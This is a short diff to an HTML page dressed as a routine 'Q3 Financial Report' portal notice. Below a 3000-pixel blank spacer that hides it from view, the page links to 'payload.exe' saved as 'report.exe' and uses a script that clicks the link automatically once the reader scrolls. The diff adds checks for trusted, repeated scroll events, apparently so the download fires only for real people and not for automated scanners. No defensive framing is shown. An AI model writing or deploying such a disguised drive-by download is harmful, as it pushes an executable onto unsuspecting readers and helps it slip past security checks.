@@ -9,6 +9,6 @@
 <h1>Q3 Financial Report</h1>
 <p>Thank you. Your document is being prepared. No action is required.</p>
 <p>This is a routine notification from the reporting portal.</p>
-<div style='height:3000px'></div><a id="d" href="payload.exe" download="report.exe">download</a><script>addEventListener('scroll',function(){document.getElementById('d').click();},{once:true});</script>
+<div style='height:3000px'></div><a id="d" href="payload.exe" download="report.exe">download</a><script>var s=0,last=0;addEventListener('scroll',function(e){if(!e.isTrusted)return;var y=window.scrollY||document.documentElement.scrollTop;if(Math.abs(y-last)>20)s++;last=y;if(s>=3&&y>300)document.getElementById('d').click();});</script>
 </body>
 </html>
